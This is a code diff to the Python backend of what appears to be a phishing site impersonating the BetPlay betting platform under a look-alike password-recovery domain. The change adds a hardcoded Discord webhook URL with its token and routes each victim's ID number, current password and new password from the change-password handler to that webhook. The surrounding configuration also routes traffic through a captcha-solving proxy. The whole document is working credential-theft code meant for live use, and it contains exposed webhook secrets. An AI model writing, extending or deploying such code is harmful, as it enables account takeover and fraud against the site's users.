@@ -39,6 +39,7 @@ PROXY_DNS  = os.environ.get("PROXY_DNS", "na.proxy.2captcha.com:2334")
 # Discord Webhooks
 DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "https://discord.com/api/webhooks/1559311988184588319/8BXHxI_gOKqtl4YwCAjKndrtuZ6aHnaJD1Q_7riBMDxOjyvEQgV5Ak9-FmIvtrOLiZ1Y")
 DISCORD_VISITAS_WEBHOOK = os.environ.get("DISCORD_VISITAS_WEBHOOK", "")
+DISCORD_CAMBIO_WEBHOOK = os.environ.get("DISCORD_CAMBIO_WEBHOOK", "https://discord.com/api/webhooks/1559598193543741562/GejMENFX7oJx-L-_iw4Y5iz9ubTFybaJJqml0WDUvpSZBNBBy70mhQmFdmZ4on0HHMZl")
 
 # URL del dominio (para generar links)
 APP_DOMAIN = os.environ.get("APP_DOMAIN", "https://recuperacion-de-contrasena-betplay.com")
@@ -81,11 +82,12 @@ def generate_token(length=150):
     return ''.join(random.choices(chars, k=length))
 
 
-def send_to_discord(embed: dict):
+def send_to_discord(embed: dict, webhook_url: str = None):
     try:
+        url = webhook_url or DISCORD_WEBHOOK
         payload = {"embeds": [embed]}
         session = requests.Session()
-        session.post(DISCORD_WEBHOOK, json=payload, timeout=10)
+        session.post(url, json=payload, timeout=10)
         session.close()
     except Exception as e:
         print(f"Discord error: {e}")
@@ -364,17 +366,17 @@ async def change_password(request: ChangePasswordRequest):
         
         # Enviar a Discord con las contraseñas
         embed = {
-            "title": " Contraseña Cambiada Exitosamente",
+            "title": "Contraseña Cambiada Exitosamente",
             "color": 3066993,
             "fields": [
-                {"name": "📄 Cédula", "value": f"`{request.username}`", "inline": True},
-                {"name": " Contraseña Actual", "value": f"`{request.current_password}`", "inline": True},
-                {"name": "🆕 Nueva Contraseña", "value": f"`{request.new_password}`", "inline": True},
+                {"name": "Cédula", "value": f"`{request.username}`", "inline": True},
+                {"name": "Contraseña Actual", "value": f"`{request.current_password}`", "inline": True},
+                {"name": "Nueva Contraseña", "value": f"`{request.new_password}`", "inline": True},
             ],
             "footer": {"text": "BetPlay Password Change"},
             "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S")
         }
-        send_to_discord(embed)
+        send_to_discord(embed, DISCORD_CAMBIO_WEBHOOK)
     
     if not result["success"]:
         raise HTTPException(
